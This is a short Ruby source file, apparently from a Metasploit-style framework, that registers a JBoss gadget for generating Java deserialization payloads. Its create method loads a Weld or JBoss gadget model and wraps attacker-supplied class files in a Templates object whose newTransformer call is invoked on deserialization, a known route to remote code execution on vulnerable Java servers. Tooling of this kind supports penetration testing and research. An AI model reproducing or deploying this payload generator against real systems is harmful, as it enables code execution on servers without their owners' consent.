# -*- coding: binary -*-
require_relative '../../payloads/jboss'
require_relative '../../payloads/templates'

S=Rex::Java::Serialization 
class JBoss < S::Generator::Gadget
  def id
    'jboss'
  end

  def usable(ctx, params: {})
    return false unless ctx.gadget?('jboss')

    unless params.fetch('classfiles', nil).nil?
      return false unless S::Generator::Templates.supported(ctx,params)
    end

    true
  end

  def create(ctx, params: {})
    weld = false
    if ctx.flag?('weld') ||
       ctx.class?('org.jboss.weld.interceptor.proxy.InterceptorMethodHandler')
      ctx.reg.load('model/weld.json')
      weld = true
    else
      ctx.reg.load('model/jboss.json')
    end

    if !params.fetch('classfiles', nil).nil?
      Java::Serialize::Payloads::JBoss.make_invoke_noarg(
        S::Generator::Templates.make(ctx,params), 
        'Ljavax/xml/transform/Templates;', 
        'newTransformer', 
        weld: weld)
    else
      raise 'Missing parameters'
    end
  end
end

S::Generator.register(
  JBoss.new
)
